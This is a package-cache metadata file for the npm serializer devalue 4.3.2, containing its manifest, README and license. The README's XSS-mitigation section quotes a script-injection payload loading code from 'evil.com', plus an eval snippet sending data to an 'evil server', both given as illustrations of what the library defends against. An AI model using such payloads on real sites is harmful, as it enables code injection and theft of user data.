{
  "manifest": {
    "name": "devalue",
    "description": "Gets the job done when JSON.stringify can't",
    "version": "4.3.2",
    "repository": {
      "type": "git",
      "url": "https://github.com/Rich-Harris/devalue.git"
    },
    "exports": {
      ".": {
        "types": "./types/index.d.ts",
        "import": "./index.js",
        "default": "./index.js"
      }
    },
    "files": [
      "index.js",
      "src",
      "types"
    ],
    "types": "./types/index.d.ts",
    "devDependencies": {
      "dts-buddy": "^0.0.4",
      "publint": "^0.1.7",
      "typescript": "^3.1.3",
      "uvu": "^0.5.6"
    },
    "scripts": {
      "build": "dts-buddy",
      "test": "uvu test",
      "prepublishOnly": "npm test && publint && npm run build"
    },
    "license": "MIT",
    "type": "module",
    "packageManager": "pnpm@8.5.1",
    "_registry": "npm",
    "_loc": "/home/ubuntu/.cache/yarn/v6/npm-devalue-4.3.2-cc44e4cf3872ac5a78229fbce3b77e57032727b5-integrity/node_modules/devalue/package.json",
    "readmeFilename": "README.md",
    "readme": "# devalue\n\nLike `JSON.stringify`, but handles\n\n- cyclical references (`obj.self = obj`)\n- repeated references (`[value, value]`)\n- `undefined`, `Infinity`, `NaN`, `-0`\n- regular expressions\n- dates\n- `Map` and `Set`\n- `BigInt`\n- custom types via replacers, reducers and revivers\n\nTry it out [here](https://svelte.dev/repl/138d70def7a748ce9eda736ef1c71239?version=3.49.0).\n\n## Goals:\n\n- Performance\n- Security (see [XSS mitigation](#xss-mitigation))\n- Compact output\n\n## Non-goals:\n\n- Human-readable output\n- Stringifying functions\n\n## Usage\n\nThere are two ways to use `devalue`:\n\n### `uneval`\n\nThis function takes a JavaScript value and returns the JavaScript code to create an equivalent value — sort of like `eval` in reverse:\n\n```js\nimport * as devalue from 'devalue';\n\nlet obj = { message: 'hello' };\ndevalue.uneval(obj); // '{message:\"hello\"}'\n\nobj.self = obj;\ndevalue.uneval(obj); // '(function(a){a.message=\"hello\";a.self=a;return a}({}))'\n```\n\nUse `uneval` when you want the most compact possible output and don't want to include any code for parsing the serialized value.\n\n### `stringify` and `parse`\n\nThese two functions are analogous to `JSON.stringify` and `JSON.parse`:\n\n```js\nimport * as devalue from 'devalue';\n\nlet obj = { message: 'hello' };\n\nlet stringified = devalue.stringify(obj); // '[{\"message\":1},\"hello\"]'\ndevalue.parse(stringified); // { message: 'hello' }\n\nobj.self = obj;\n\nstringified = devalue.stringify(obj); // '[{\"message\":1,\"self\":0},\"hello\"]'\ndevalue.parse(stringified); // { message: 'hello', self: [Circular] }\n```\n\nUse `stringify` and `parse` when evaluating JavaScript isn't an option.\n\n### `unflatten`\n\nIn the case where devalued data is one part of a larger JSON string, `unflatten` allows you to revive just the bit you need:\n\n```js\nimport * as devalue from 'devalue';\n\nconst json = `{\n  \"type\": \"data\",\n  \"data\": ${devalue.stringify(data)}\n}`;\n\nconst data = devalue.unflatten(JSON.parse(json).data);\n```\n\n## Custom types\n\nYou can serialize and serialize custom types by passing a second argument to `stringify` containing an object of types and their _reducers_, and a second argument to `parse` or `unflatten` containing an object of types and their _revivers_:\n\n```js\nclass Vector {\n\tconstructor(x, y) {\n\t\tthis.x = x;\n\t\tthis.y = y;\n\t}\n\n\tmagnitude() {\n\t\treturn Math.sqrt(this.x * this.x + this.y * this.y);\n\t}\n}\n\nconst stringified = devalue.stringify(new Vector(30, 40), {\n\tVector: (value) => value instanceof Vector && [value.x, value.y]\n});\n\nconsole.log(stringified); // [[\"Vector\",1],[2,3],30,40]\n\nconst vector = devalue.parse(stringified, {\n\tVector: ([x, y]) => new Vector(x, y)\n});\n\nconsole.log(vector.magnitude()); // 50\n```\n\nIf a function passed to `stringify` returns a truthy value, it's treated as a match.\n\nYou can also use custom types with `uneval` by specifying a custom replacer:\n\n```js\ndevalue.uneval(vector, (value, uneval) => {\n\tif (value instanceof Vector) {\n\t\treturn `new Vector(${value.x},${value.y})`;\n\t}\n}); // `new Vector(30,40)`\n```\n\nNote that any variables referenced in the resulting JavaScript (like `Vector` in the example above) must be in scope when it runs.\n\n## Error handling\n\nIf `uneval` or `stringify` encounters a function or a non-POJO that isn't handled by a custom replacer/reducer, it will throw an error. You can find where in the input data the offending value lives by inspecting `error.path`:\n\n```js\ntry {\n\tconst map = new Map();\n\tmap.set('key', function invalid() {});\n\n\tuneval({\n\t\tobject: {\n\t\t\tarray: [map]\n\t\t}\n\t});\n} catch (e) {\n\tconsole.log(e.path); // '.object.array[0].get(\"key\")'\n}\n```\n\n## XSS mitigation\n\nSay you're server-rendering a page and want to serialize some state, which could include user input. `JSON.stringify` doesn't protect against XSS attacks:\n\n```js\nconst state = {\n\tuserinput: `</script><script src='https://evil.com/mwahaha.js'>`\n};\n\nconst template = `\n<script>\n  // NEVER DO THIS\n  var preloaded = ${JSON.stringify(state)};\n</script>`;\n```\n\nWhich would result in this:\n\n```html\n<script>\n\t// NEVER DO THIS\n\tvar preloaded = {\"userinput\":\"\n</script>\n<script src=\"https://evil.com/mwahaha.js\">\n\t\"};\n</script>\n```\n\nUsing `uneval` or `stringify`, we're protected against that attack:\n\n```js\nconst template = `\n<script>\n  var preloaded = ${uneval(state)};\n</script>`;\n```\n\n```html\n<script>\n\tvar preloaded = {\n\t\tuserinput:\n\t\t\t\"\\\\u003C\\\\u002Fscript\\\\u003E\\\\u003Cscript src='https:\\\\u002F\\\\u002Fevil.com\\\\u002Fmwahaha.js'\\\\u003E\"\n\t};\n</script>\n```\n\nThis, along with the fact that `uneval` and `stringify` bail on functions and non-POJOs, stops attackers from executing arbitrary code. Strings generated by `uneval` can be safely deserialized with `eval` or `new Function`:\n\n```js\nconst value = (0, eval)('(' + str + ')');\n```\n\n## Other security considerations\n\nWhile `uneval` prevents the XSS vulnerability shown above, meaning you can use it to send data from server to client, **you should not send user data from client to server** using the same method. Since it has to be evaluated, an attacker that successfully submitted data that bypassed `uneval` would have access to your system.\n\nWhen using `eval`, ensure that you call it _indirectly_ so that the evaluated code doesn't have access to the surrounding scope:\n\n```js\n{\n\tconst sensitiveData = 'Setec Astronomy';\n\teval('sendToEvilServer(sensitiveData)'); // pwned :(\n\t(0, eval)('sendToEvilServer(sensitiveData)'); // nice try, evildoer!\n}\n```\n\nUsing `new Function(code)` is akin to using indirect eval.\n\n## See also\n\n- [lave](https://github.com/jed/lave) by Jed Schmidt\n- [arson](https://github.com/benjamn/arson) by Ben Newman. The `stringify`/`parse` approach in `devalue` was inspired by `arson`\n- [oson](https://github.com/KnorpelSenf/oson) by Steffen Trog\n- [tosource](https://github.com/marcello3d/node-tosource) by Marcello Bastéa-Forte\n- [serialize-javascript](https://github.com/yahoo/serialize-javascript) by Eric Ferraiuolo\n- [jsesc](https://github.com/mathiasbynens/jsesc) by Mathias Bynens\n- [superjson](https://github.com/blitz-js/superjson) by Blitz\n- [next-json](https://github.com/iccicci/next-json) by Daniele Ricci\n\n## License\n\n[MIT](LICENSE)\n",
    "licenseText": "Copyright (c) 2018-19 [these people](https://github.com/rich-harris/devalue/graphs/contributors)\n\nPermission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n"
  },
  "artifacts": [],
  "remote": {
    "resolved": "https://registry.yarnpkg.com/devalue/-/devalue-4.3.2.tgz#cc44e4cf3872ac5a78229fbce3b77e57032727b5",
    "type": "tarball",
    "reference": "https://registry.yarnpkg.com/devalue/-/devalue-4.3.2.tgz",
    "hash": "cc44e4cf3872ac5a78229fbce3b77e57032727b5",
    "integrity": "sha512-KqFl6pOgOW+Y6wJgu80rHpo2/3H07vr8ntR9rkkFIRETewbf5GaYYcakYfiKz89K+sLsuPkQIZaXDMjUObZwWg==",
    "registry": "npm",
    "packageName": "devalue",
    "cacheIntegrity": "sha512-KqFl6pOgOW+Y6wJgu80rHpo2/3H07vr8ntR9rkkFIRETewbf5GaYYcakYfiKz89K+sLsuPkQIZaXDMjUObZwWg== sha1-zETkzzhyrFp4Ip+847d+VwMnJ7U="
  },
  "registry": "npm",
  "hash": "cc44e4cf3872ac5a78229fbce3b77e57032727b5"
}